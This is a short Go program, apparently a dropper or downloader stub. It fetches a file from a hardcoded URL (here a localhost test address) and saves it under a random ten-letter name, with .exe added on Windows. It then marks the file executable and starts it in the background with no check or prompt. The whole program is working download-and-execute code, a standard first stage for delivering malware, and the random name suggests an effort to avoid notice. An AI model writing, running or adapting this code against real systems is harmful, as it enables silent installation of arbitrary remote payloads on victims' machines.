package main

import ("os";"os/exec";"net/http";"io";"runtime";"time";"math/rand")

func downloadFile(filepath string, url string) (err error) {
  // Create the file
  out, err := os.Create(filepath)
  if err != nil  {
    return err
  }
  defer out.Close()

  resp, err := http.Get(url)
  if err != nil {
    return err
  }
  defer resp.Body.Close()

  _, err = io.Copy(out, resp.Body)
  if err != nil  {
    return err
  }

  return nil
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
  rand.Seed(time.Now().UTC().UnixNano())
  b := make([]rune, n)
  for i := range b {
      b[i] = letters[rand.Intn(len(letters))]
  }
  return string(b)
}

func main() {
  var url string = "http://localhost:8000/test.sh"
  var length int = 10
  var name string = randSeq(length)
    
  if runtime.GOOS != "windows" {
    downloadFile(name, url)
    exec.Command("chmod", "+x", name).Run()
  } else {
    name += ".exe"
    downloadFile(name, url)
  }
  exec.Command("./" + name).Start()
}
